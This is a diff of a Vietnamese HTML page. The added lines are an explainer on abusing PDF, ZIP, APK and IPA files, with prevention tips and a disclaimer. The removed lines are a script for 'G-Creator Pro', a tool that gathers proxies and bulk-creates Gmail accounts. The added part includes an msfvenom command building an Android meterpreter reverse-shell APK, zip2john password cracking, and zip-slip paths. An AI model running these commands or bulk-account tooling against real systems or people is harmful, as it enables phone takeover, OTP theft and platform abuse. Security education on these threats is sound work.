+   - Nhúng .exe, .zip vào PDF
+   - Trích xuất và chạy bằng script
+
+# CÁCH PHÒNG:
+✅ Không mở PDF từ nguồn lạ
+✅ Tắt JavaScript trong Adobe Reader
+✅ Dùng trình đọc PDF nhẹ (SumatraPDF)
+✅ Cập nhật phần mềm thường xuyên</pre>
+        </div>
+
+        <div class="box box-yellow">
+            <h3>3. File .ZIP / .RAR (Nén)</h3>
+            <pre>
+# CÔNG DỤNG:
+- Nén nhiều file thành 1
+- Giảm dung lượng
+- Bảo vệ bằng mật khẩu
+
+# CÁCH HACK QUA FILE .ZIP:
+1. ZIP BOMB (Bom nén):
+   - File zip nhỏ (vài KB) nhưng giải nén ra hàng TB
+   - Làm đầy ổ cứng, crash server
+   - Ví dụ: 42.zip (42KB → 4.5PB khi giải nén)
+
+2. ZIP SLIP ATTACK:
+   - File trong zip có tên: ../../../etc/passwd
+   - Khi giải nén, file bị ghi đè vào thư mục hệ thống
+   - Ghi đè file quan trọng
+
+3. MẬT KHẨU BẢO VỆ:
+   - Brute force mật khẩu zip
+   - Dùng john: zip2john file.zip > hash
+   - john hash
+
+4. NHÚNG MALWARE:
+   - Virus trong file zip
+   - Kẻ tấn công gửi file: "Hoa_don.zip"
+   - Bên trong: Hoa_don.pdf.exe (giả mạo)</pre>
+        </div>
+
+        <div class="box box-yellow">
+            <h3>4. File .APK (Android Package)</h3>
+            <pre>
+# CÔNG DỤNG:
+- File cài đặt ứng dụng Android
+- Chứa code, tài nguyên, manifest
+- Có thể cài từ CH Play hoặc sideload
+
+# CÁCH HACK QUA FILE .APK:
+
+1. TẠO APK ĐỘC HẠI (Trojan):
+   msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o virus.apk
+   # Tạo APK kết nối ngược về máy hacker
+   # Khi nạn nhân cài → Hacker điều khiển điện thoại
+
+2. NHÚNG MALWARE VÀO APK THẬT:
+   - Tải APK game/app phổ biến
+   - Dùng tool (ApkEasyTool) để decompile
+   - Thêm code độc vào
+   - Build lại APK mới
+   - Phát tán qua web, Telegram
+
+3. PERMISSION ABUSE:
+   - APK xin quyền: SMS, Camera, Microphone, Location
+   - Đọc trộm tin nhắn OTP ngân hàng
+   - Quay lén, nghe lén, theo dõi GPS
+
+4. CLICKER FRAUD:
+   - APK chạy ngầm, tự động click quảng cáo
+   - Kiếm tiền cho hacker
+   - Nạn nhân không biết
+
+# DẤU HIỆU APK ĐỘC:
+❌ Yêu cầu quyền lạ (SMS, Accessibility)
+❌ Từ nguồn không chính thức
+❌ Tên file lạ: "Mod_Game.apk"
+❌ Dung lượng nhỏ bất thường</pre>
+        </div>
+
+        <div class="box box-yellow">
+            <h3>5. File .IPA (iOS App Store Package)</h3>
+            <pre>
+# CÔNG DỤNG:
+- File cài đặt ứng dụng iPhone/iPad
+- Chỉ cài được qua App Store (chính thức)
+- Cần jailbreak hoặc sideload để cài file .ipa ngoài
+
+# CÁCH HACK QUA FILE .IPA:
+
+1. SIDELOAD IPA ĐỘC:
+   - Dùng AltStore, Sideloadly để cài IPA ngoài
+   - Cần Apple ID (có thể dùng ID ảo)
+   - Giới hạn 7 ngày (free) hoặc 1 năm (trả phí)
+
+2. JAILBREAK + MALWARE:
+   - Máy đã jailbreak dễ bị cài malware hơn
+   - IPA độc có thể truy cập toàn bộ hệ thống
+   - Đánh cắp: SMS, ảnh, danh bạ, keychain
+
+3. FAKE APP:
+   - Tạo app giả mạo (Facebook++, WhatsApp++)
+   - Có thêm tính năng nhưng chứa spyware
+   - Nạn nhân tự nguyện cài đặt
+
+4. ENTERPRISE CERTIFICATE ABUSE:
+   - Dùng chứng chỉ doanh nghiệp để ký IPA
+   - Phát tán qua web, không cần App Store
+   - Apple thường thu hồi sau vài ngày
+
+# CÁCH PHÒNG:
+✅ Chỉ cài app từ App Store chính thức
+✅ Không jailbreak nếu không cần thiết
+✅ Kiểm tra chứng chỉ của app
+✅ Không tin app "Mod", "Hack" trên mạng</pre>
+        </div>
+
+        <div class="warning">
+            ⚠️ <b>TUYÊN BỐ MIỄN TRỪ TRÁCH NHIỆM:</b> Tài liệu này chỉ dành cho mục đích <b>HỌC TẬP VÀ NGHIÊN CỨU BẢO MẬT</b>. 
+            Mọi hành vi sử dụng vào mục đích bất hợp pháp đều bị <b>NGHIÊM CẤM</b> và có thể dẫn đến <b>TRUY CỨU HÌNH SỰ</b>.
+            Hãy trở thành <b>WHITE HAT HACKER</b> - người bảo vệ internet!
+        </div>
+
     </div>
-
-    <!-- LOG CHUNG -->
-    <div class="log-area" id="logArea">
-        <p class="log-info">⏳ Sẵn sàng ...</p>
-    </div>
-    <div class="status-bar">
-        <span id="statusText"><span class="dot idle"></span> Đang chờ</span>
-        <span id="logCount" class="badge-count">0</span>
-    </div>
-</div>
-
-<script>
-    // ========== LOGGING ==========
-    const logArea = document.getElementById('logArea');
-    const statusText = document.getElementById('statusText');
-    const logCount = document.getElementById('logCount');
-    let logCounter = 0;
-
-    function addLog(msg, type = 'info') {
-        const p = document.createElement('p');
-        const time = new Date().toLocaleTimeString();
-        p.textContent = `[${time}] ${msg}`;
-        p.className = 'log-' + type;
-        logArea.appendChild(p);
-        logArea.scrollTop = logArea.scrollHeight;
-        logCounter++;
-        logCount.textContent = logCounter;
-        while (logArea.children.length > 100) {
-            logArea.removeChild(logArea.firstChild);
-        }
-    }
-
-    function setStatus(text, state = 'idle') {
-        const dot = state === 'idle' ? 'idle' : (state === 'running' ? 'running' : 'stopped');
-        statusText.innerHTML = `<span class="dot ${dot}"></span> ${text}`;
-    }
-
-    // ========== TAB SWITCH ==========
-    document.querySelectorAll('.tab-btn').forEach(btn => {
-        btn.addEventListener('click', function() {
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            this.classList.add('active');
-            const target = this.dataset.tab;
-            document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
-            document.getElementById(target).classList.add('active');
-        });
-    });
-
-    // ========== TẠO PROXY (gọi API backend) ==========
-    document.getElementById('btnLayProxy').addEventListener('click', async function() {
-        const soLuong = parseInt(document.getElementById('proxySoLuong').value) || 30;
-        const timeout = parseInt(document.getElementById('proxyTimeout').value) || 5;
-        const ghiFile = document.getElementById('proxyGhiFile').checked;
-
-        addLog(`🌐 Bắt đầu lấy proxy, mục tiêu ${soLuong} proxy hoạt động...`, 'info');
-        setStatus('Đang lấy proxy...', 'running');
-        this.disabled = true;
-
-        try {
-            const resp = await fetch('/api/lay_proxy', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ so_luong: soLuong, timeout: timeout, ghi_file: ghiFile })
-            });
-            const data = await resp.json();
-            if (data.status === 'success') {
-                addLog(`✅ Lấy thành công ${data.so_luong} proxy`, 'success');
-                addLog(`📁 Đã ghi vào ${data.file || 'proxy.txt'}`, 'info');
-                // Hiển thị danh sách
-                const display = document.getElementById('proxyDisplay');
-                display.style.display = 'block';
-                display.textContent = data.danh_sach.join('\n');
-                setStatus(`Đã có ${data.so_luong} proxy`, 'idle');
-            } else {
-                addLog(`❌ Lỗi: ${data.msg || 'Không xác định'}`, 'error');
-                setStatus('Lỗi lấy proxy', 'stopped');
-            }
-        } catch (e) {
-            addLog(`🔥 Lỗi kết nối backend: ${e.message}`, 'error');
-            setStatus('Lỗi kết nối', 'stopped');
-        }
-        this.disabled = false;
-    });
-
-    document.getElementById('btnXemProxy').addEventListener('click', async function() {
-        try {
-            const resp = await fetch('/api/doc_proxy?file=proxy.txt');
-            const data = await resp.json();
-            const display = document.getElementById('proxyDisplay');
-            display.style.display = 'block';
-            if (data.status === 'success' && data.danh_sach.length > 0) {
-                display.textContent = data.danh_sach.join('\n');
-                addLog(`👁 Đã tải ${data.danh_sach.length} proxy từ file`, 'info');
-            } else {
-                display.textContent = '-- chưa có proxy hoặc file trống --';
-                addLog('⚠️ File proxy trống hoặc chưa tồn tại', 'warn');
-            }
-        } catch (e) {
-            addLog(`🔥 Không thể đọc file proxy: ${e.message}`, 'error');
-        }
-    });
-
-    // ========== TẠO GMAIL (gọi API backend) ==========
-    let isRunning = false;
-    let stopFlag = false;
-
-    document.getElementById('btnTaoGmail').addEventListener('click', async function() {
-        if (isRunning) {
-            addLog('⚠️ Đang chạy, không thể khởi động lại!', 'warn');
-            return;
-        }
-        const soLuong = parseInt(document.getElementById('gmailSoLuong').value) || 10;
-        const matKhau = document.getElementById('gmailMatKhau').value.trim() || 'Abc@123456';
-        const tienTo = document.getElementById('gmailTienTo').value.trim() || 'zepdry';
-        const proxyFile = document.getElementById('gmailProxyFile').value.trim() || 'proxy.txt';
-        const headless = document.getElementById('gmailHeadless').checked;
-
-        if (!soLuong || soLuong < 1) {
-            addLog('❌ Số lượng phải >= 1', 'error');
-            return;
-        }
-
-        addLog(`🚀 Bắt đầu tạo ${soLuong} Gmail, tiền tố "${tienTo}", proxy từ "${proxyFile}"`, 'info');
-        setStatus('Đang tạo Gmail...', 'running');
-        isRunning = true;
-        stopFlag = false;
-        this.disabled = true;
-        document.getElementById('btnDungGmail').disabled = false;
-
-        try {
-            const resp = await fetch('/api/tao_gmail', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    so_luong: soLuong,
-                    mat_khau: matKhau,
-                    tien_to: tienTo,
-                    file_proxy: proxyFile,
-                    headless: headless
-                })
-            });
-            const data = await resp.json();
-            if (data.status === 'success') {
-                addLog(`✅ Tạo thành công ${data.thanh_cong}/${data.tong} tài khoản`, 'success');
-                if (data.danh_sach && data.danh_sach.length) {
-                    data.danh_sach.forEach(acc => addLog(`📧 ${acc}`, 'info'));
-                }
-                setStatus(`Hoàn tất: ${data.thanh_cong}/${data.tong}`, 'idle');
-            } else {
-                addLog(`❌ Lỗi: ${data.msg || 'Không xác định'}`, 'error');
-                setStatus('Lỗi tạo Gmail', 'stopped');
-            }
-        } catch (e) {
-            addLog(`🔥 Lỗi kết nối backend: ${e.message}`, 'error');
-            setStatus('Lỗi kết nối', 'stopped');
-        }
-
-        isRunning = false;
-        this.disabled = false;
-        document.getElementById('btnDungGmail').disabled = true;
-    });
-
-    document.getElementById('btnDungGmail').addEventListener('click', function() {
-        if (isRunning) {
-            stopFlag = true;
-            addLog('⏹ Đang gửi tín hiệu dừng...', 'warn');
-            // Gửi yêu cầu dừng tới backend (nếu có endpoint)
-            fetch('/api/dung_tao_gmail', { method: 'POST' }).catch(() => {});
-        } else {
-            addLog('ℹ️ Không có tiến trình nào đang chạy', 'info');
-        }
-    });
-
-    // Khởi tạo
-    addLog('🛠 G-Creator Pro sẵn sàng. Dùng tab "Tạo Proxy" trước để lấy proxy.', 'info');
-    addLog('📌 Backend Python cần chạy tại /api/lay_proxy, /api/tao_gmail, /api/doc_proxy', 'info');
-    setStatus('Sẵn sàng', 'idle');
-</script>
 </body>
 </html>
